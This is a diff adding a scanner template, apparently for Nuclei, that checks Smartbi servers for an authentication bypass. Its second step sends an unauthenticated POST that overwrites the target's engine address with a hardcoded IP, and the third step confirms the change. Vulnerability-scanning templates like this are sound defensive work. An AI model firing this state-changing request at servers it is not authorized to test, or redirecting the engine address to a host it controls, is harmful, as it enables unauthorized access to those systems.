@@ -1,0 +1,63 @@
+id: poc-yaml-smartbi-address-auth-bypass
+info:
+  name: Smartbi Authentication Bypass Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: auth-bypass
+
+variables:
+  t1: "{{rand_int(5000, 10000)}}"
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - id: step-1
+    method: GET
+    path:
+      - "{{BaseURL}}/smartbi/smartbix/api/monitor/setEngineAddress"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 406
+      - type: word
+        part: body
+        words:
+          - "Unknown error -> Request method 'GET' not supported"
+          - "smartbix.SmartbiXException"
+
+  - id: step-2
+    method: POST
+    path:
+      - "{{BaseURL}}/smartbi/smartbix/api/monitor/setEngineAddress"
+    headers:
+      Content-Type: application/json
+    body: "http://192.168.133.123:{{t1}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"message\":\"Engine address updated successfully\""
+          - "\"took\":1"
+
+  - id: step-3
+    method: POST
+    path:
+      - "{{BaseURL}}/smartbi/smartbix/api/monitor/engineInfo"
+    headers:
+      Content-Type: application/json
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"message\":\"Operation successful\""
+          - "\"took\":0"
+          - "{{t1}}"
